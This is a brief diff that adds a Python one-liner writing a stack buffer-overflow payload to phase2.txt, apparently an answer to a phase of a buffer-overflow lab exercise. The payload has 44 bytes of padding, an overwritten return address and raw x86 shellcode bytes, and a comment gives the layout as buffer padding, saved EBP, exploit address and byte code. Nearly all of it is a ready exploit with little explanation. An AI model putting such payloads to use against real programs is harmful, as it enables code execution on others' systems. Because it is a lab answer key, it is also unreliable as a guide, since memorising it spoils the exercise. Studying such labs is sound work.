@@ -1,0 +1,3 @@
+python -c "print 'A' * 44 + '\xb8\x3d\x68\x55' + '\xbb\x92\x8b\x04\x08\x53\xbb\x0c\xc2\x04\x08\xb9\x85\xf8\xd5\x4e\x89\x0b\xc3'">phase2.txt
+
+'A' * buffersize + 'A' * oldebpsize + exploit address + exploit byte code
